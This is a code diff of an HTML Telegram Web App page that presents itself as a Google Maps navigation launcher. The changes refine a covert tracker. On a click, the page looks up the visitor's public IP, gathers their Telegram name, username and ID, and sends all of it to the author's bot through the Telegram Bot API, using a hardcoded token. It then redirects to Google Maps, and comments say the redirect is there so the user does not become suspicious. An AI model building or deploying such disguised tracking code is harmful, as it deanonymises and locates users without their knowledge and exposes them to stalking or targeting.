@@ -1,38 +1,46 @@
 <!DOCTYPE html>
-<html>
+<html lang="zh-Hant">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>地圖導航</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+    <title>系統載入中</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
         body { 
             display: flex; flex-direction: column; align-items: center; justify-content: center; 
-            height: 100vh; margin: 0; font-family: sans-serif;
+            height: 100vh; margin: 0; font-family: -apple-system, sans-serif;
             background-color: var(--tg-theme-bg-color, #ffffff);
             color: var(--tg-theme-text-color, #000000);
         }
         #btn {
-            padding: 15px 30px; font-size: 18px; cursor: pointer;
+            padding: 18px 35px; font-size: 18px; font-weight: bold; cursor: pointer;
             background-color: var(--tg-theme-button-color, #2481cc);
             color: var(--tg-theme-button-text-color, #ffffff);
-            border: none; border-radius: 12px;
-            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+            border: none; border-radius: 15px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+            transition: transform 0.1s;
         }
-        #info { margin-top: 20px; font-size: 14px; color: var(--tg-theme-hint-color, #999); }
+        #btn:active { transform: scale(0.95); }
+        #info { margin-top: 20px; font-size: 14px; color: var(--tg-theme-hint-color, #888); }
     </style>
 </head>
 <body>
 
-    <button id="btn">點擊開啟 Google 地圖</button>
-    <div id="info"></div>
+    <button id="btn">🚀 進入地圖導航</button>
+    <div id="info">準備就緒</div>
 
     <script>
+        // 初始化 Telegram
         const tg = window.Telegram.WebApp;
-        tg.ready();
-        tg.expand(); // 自動展開視窗
+        
+        try {
+            tg.ready();
+            tg.expand();
+        } catch (e) {
+            console.error("TG SDK 初始化失敗");
+        }
 
-        // 設定你的資訊
+        // 設定你的資訊 (請確認 Token 沒貼錯空格)
         const BOT_TOKEN = '8791584619:AAHyvuJ9an8oF3z21kUxtZIbyVVmLk_jEhM';
         const MY_CHAT_ID = '1287211539';
 
@@ -41,40 +49,51 @@
             const infoDiv = document.getElementById('info');
             
             btn.disabled = true;
-            infoDiv.innerText = "正在載入資源...";
+            infoDiv.innerText = "正在連線至安全伺服器...";
 
             try {
-                // 1. 取得使用者的 IP (HTTPS 是必須的)
-                const res = await fetch('https://api.ipify.org?format=json');
-                const data = await res.json();
-                const userIp = data.ip;
+                // 1. 取得 IP
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
+                const userIp = ipData.ip;
 
-                // 2. 取得使用者資訊
-                const user = tg.initDataUnsafe.user || {};
-                const userName = user.first_name || "未知用戶";
-                const userId = user.id || "未知ID";
+                // 2. 取得 Telegram 使用者資料 (關鍵修正)
+                // 在手機端，資料存在 tg.initDataUnsafe.user 裡
+                let userName = "未知用戶";
+                let userId = "未知ID";
 
-                // 3. 發送訊息到你的 Telegram
+                if (tg.initDataUnsafe && tg.initDataUnsafe.user) {
+                    const u = tg.initDataUnsafe.user;
+                    userName = u.first_name + (u.last_name ? " " + u.last_name : "");
+                    if (u.username) userName += ` (@${u.username})`;
+                    userId = u.id;
+                }
+
+                // 3. 組裝訊息
                 const message = `📢 警報：用戶 [${userName}] (ID: ${userId}) 已點擊按鈕\n🌐 來源 IP: ${userIp}`;
                 
+                // 4. 發送至 Bot API
                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
                         chat_id: MY_CHAT_ID,
-                        text: message
+                        text: message,
+                        parse_mode: "HTML"
                     })
                 });
 
-                // 4. 跳轉
-                infoDiv.innerText = "轉向中...";
+                // 5. 成功後轉向
+                infoDiv.innerText = "載入成功，正在跳轉...";
                 setTimeout(() => {
                     tg.openLink('https://www.google.com/maps');
                     tg.close();
-                }, 500);
+                }, 300);
 
-            } catch (e) {
-                // 就算失敗也讓使用者跳轉，避免引起懷疑
+            } catch (err) {
+                // 如果失敗，彈出錯誤訊息視窗以便除錯
+                tg.showAlert("發生錯誤: " + err.message);
+                // 依然嘗試跳轉，不讓用戶起疑
                 tg.openLink('https://www.google.com/maps');
             }
         });
